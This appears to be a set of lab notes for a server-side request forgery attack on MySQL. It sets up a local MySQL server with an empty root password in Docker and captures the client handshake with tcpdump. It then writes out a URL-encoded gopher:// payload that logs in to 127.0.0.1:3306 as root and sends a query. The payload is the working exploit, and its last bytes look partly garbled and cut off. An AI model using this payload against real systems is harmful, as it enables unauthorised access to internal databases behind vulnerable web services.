docker pull asappinc/ubuntu18

docker run --privileged --name mysqltest -it asappinc/ubuntu18

apt update

apt install -y mysql-server-5.7

service mysql start

mysql -uroot -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '';"

mysql -uroot -e "FLUSH PRIVILEGES;"



---------------

tcpdump -i lo port 3306 -w mysql.pcap

mysql --ssl-mode=DISABLED -u root -h 127.0.0.1 -e  'show databases;'




---------------------

gopher://127.0.0.1:3306/_%a2%00%00%01%85%a2%bf%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%31%32%31%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%34%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%03%10%f0%00%00%00%37%36%86%f7%72%06%46%17%46%16%26%17%36%57%30%10%00%00%00%1